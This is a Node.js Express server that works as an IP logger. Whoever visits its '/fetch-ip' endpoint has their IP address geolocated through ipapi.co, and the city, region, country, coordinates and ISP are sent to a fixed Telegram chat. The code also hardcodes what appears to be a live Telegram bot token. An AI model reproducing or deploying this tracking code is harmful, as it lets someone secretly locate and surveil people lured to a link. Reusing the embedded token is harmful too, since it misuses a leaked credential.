const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

// Bot token
const token = "7388778092:AAEo4Nhm5LM-cc3fvxPCb6ifyNzH1KUz9KE";

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

// Define Telegram ID for user to send messages
const ajsal = '6524787237';

// Create an express app
const app = express();

// Function to fetch user data from ipapi.co using their IP
async function fetchUserData(ip) {
  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    const userData = response.data;

    // Format the message
    const message = `
🌍 *IP API Data*:
- **IP Address**: ${userData.ip}
- **City**: ${userData.city}
- **Region**: ${userData.region}
- **Country**: ${userData.country_name}
- **Latitude**: ${userData.latitude}
- **Longitude**: ${userData.longitude}
- **ISP**: ${userData.org}
`;

    // Send the message to your Telegram
    bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Error fetching IP API data:', error.message);
  }
}

// Endpoint to capture user IP and fetch data
app.get('/fetch-ip', async (req, res) => {
  // Extract user's IP from the request headers
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Fetch user data using their IP
  await fetchUserData(userIp);

  res.send('User IP data fetched and sent to Telegram!');
});

// Start the server
app.listen(process.env.PORT || 3000, () => {
  console.log(`Server is running on port ${process.env.PORT || 3000}`);
});
